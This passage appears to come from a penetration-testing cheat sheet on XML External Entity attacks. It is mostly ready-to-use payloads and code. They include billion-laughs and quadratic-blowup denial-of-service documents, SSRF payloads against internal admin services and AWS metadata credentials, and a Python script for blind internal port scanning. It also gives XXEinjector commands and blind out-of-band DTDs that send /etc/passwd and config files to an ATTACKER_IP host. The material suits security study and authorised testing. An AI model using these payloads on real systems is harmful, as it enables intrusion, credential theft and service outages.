  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

- Let's break this bad joke down:
	- The entity `lol` is `"lol"` = 3 characters.
	- `lol1` is 10 repetitions of `lol` → 10 "lol" = 30 characters.
	- `lol2` is 10 repetitions of `lol1` → 100 "lol" = 300 characters.
	- `...`
	- `lol9` is $10^9$ repetitions of `lol` → ~1 billion "lol" = **~3 billion characters** (~3 GB of memory).

>[!note] The name "Billion Laughs" comes from the common example where the first entity is the string `"lol"`, which expands exponentially to about a billion "lol" strings. 
>lol :D

### Quadratic blowup

- **Quadratic blowup** is a variation of the Billion Laughs attack that uses quadratic entity expansion rather than exponential.
- Less dramatic but more reliable against parsers with depth limits on recursive expansion.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<bomb>
&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  <!-- repeat hundreds more times -->
</bomb>
```

- A single entity of length `N` referenced `M` times produces `N×M` characters. Memory growth is quadratic in the number of references — less violent than exponential expansion but often sufficient to degrade service.

### Infinite stream

 - **Infinite stream** references an infinite or extremely large system resource:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dos [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<dos>&xxe;</dos>
```

- On Unix, `/dev/random` generates an endless stream of random bytes. The parser reads indefinitely, consuming file descriptors and memory until the process is killed or the system runs out of resources. `/dev/urandom` produces the same result.

## SSRF via XXE

### Targeted internal service access

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>
```

- Common internal targets:

	- `http://localhost/server-status` — Apache server status.
	- `http://localhost:8080/manager/html` — Tomcat Manager.
	- `http://127.0.0.1:9200/` — Elasticsearch.
	- `http://127.0.0.1:6379/` — Redis (protocol mismatch may cause errors, but connection is established).
	- `http://127.0.0.1:2375/` — Docker daemon API.

### Internal port scanning

- Response timing and content differences between open, closed, and filtered ports allow blind port scanning of internal hosts:

```python
import requests
import time

target = "https://example.com/api/xml"
internal_ip = "192.168.1.100"
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]

for port in ports:
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{internal_ip}:{port}/">
]>
<root>&xxe;</root>'''

    try:
        t0 = time.time()
        resp = requests.post(target, data=payload, timeout=10,
                             headers={"Content-Type": "application/xml"})
        elapsed = time.time() - t0

        body = resp.text.lower()
        if "connection refused" in body:
            status = "CLOSED"
        elif elapsed > 8:
            status = "FILTERED (timeout)"
        else:
            status = f"OPEN ({elapsed:.2f}s)"

        print(f"[{port}] {status}")

    except requests.Timeout:
        print(f"[{port}] FILTERED (timeout)")
    except Exception as e:
        print(f"[{port}] ERROR: {e}")
```

 - Open ports typically return quickly with some application-level content or an error referencing the service. Closed ports return `Connection refused` almost instantly. Filtered ports time out. The pattern is parser-dependent; Java parsers tend to produce the most informative error messages.

## Automated XXE exploitation with `XXEinjector`

- For complex OOB scenarios, manual payload construction becomes tedious. 
- [`XXEinjector`](https://github.com/enjoiz/XXEinjector) automates OOB XXE exploitation and file enumeration.


>[!note]+ Installation
> ```bash
> git clone https://github.com/enjoiz/XXEinjector.git
> cd XXEinjector
> ```

- Basic file enumeration using OOB via HTTP:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=http
```

- Enumerate all files in a directory:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/ --oob=http --enumerate
```

- Use FTP for OOB:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --ftpport=21 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=ftp
```

- The `request.txt` file is a raw HTTP request with `XXEINJECT` as a placeholder in the XML body where `XXEinjector` will inject its payload. Capture the request from Burp, replace the XML content field value with `XXEINJECT`, and save it.

## Payload Quick-Reference

### Confirm entity processing

```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY x "XXE-CANARY">]>
<root><f>&x;</f></root>
```

### Basic LFI

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<root><f>&f;</f></root>
```

### LFI with PHP Base64 filter

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<root><f>&f;</f></root>
```

### SSRF to AWS metadata

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY s SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><f>&s;</f></root>
```

### Blind OOB (inline, with PHP Base64)

```xml
<?xml version="1.0"?>
<!DOCTYPE d [
  <!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % e "<!ENTITY &#x25; o SYSTEM 'http://ATTACKER_IP:8000/?d=%f;'>">
  %e; %o;
]>
<root><f>x</f></root>
```

### Blind OOB via external DTD

```xml
<!-- attacker.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % r SYSTEM "http://ATTACKER_IP:8000/attacker.dtd">
  %r; %oob;
]>
<root><f>&exfil;</f></root>
```

### Error-Based Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % f SYSTEM "file:///etc/passwd">
  <!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">
  %e; %err;
]>
<root><f>x</f></root>
```

### XInclude LFI

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### Billion Laughs DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
]>
<x>&i;</x>
```
## References and further reading

- [`Finding and exploiting blind XXE vulnerabilities — PortSwigger`](https://portswigger.net/web-security/xxe/blind)
- [`XML External Entity (XXE) — hackviser`](https://hackviser.com/tactics/pentesting/web/xxe)
- [`XXE Complete Guide: Impact, Examples, and Prevention — hackerone`](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)
- [`XML External Entity (XXE) Processing — OWASP`](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [`XXE — phonexicum`](https://phonexicum.github.io/infosec/xxe.html)
- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list)
- [`XXE Injection — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [`XXE: A complete guide to exploiting advanced XXE vulnerabilities — intigrity`](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)
- [`Out-of-band XML external entity (OOB XXE) — invicti`](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe/)
- [`XML External Entity (XXE) Injection Attack and Prevention`](https://www.invicti.com/blog/web-security/xxe-xml-external-entity-attacks/)
- [`XML External Entity (XXE) Limitations — DZone`](https://dzone.com/articles/xml-external-entity-xxe-limitations)
- [`XXE Cheatsheet — On Web-Security and -Insecurity`](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- [`XML Vulnerabilities and Attacks cheatsheet`](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
- [`XXE Exploitation — OWASP`](https://owasp.org/www-chapter-pune/meetups/2019/November/XXE_Exploitation.pdf)
- [`XML External Entity Prevention Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [`Advanced XXE Exploitation — gosecure.github.io`](https://gosecure.github.io/xxe-workshop/#0)
- [`XXEinjector`](https://github.com/enjoiz/XXEinjector)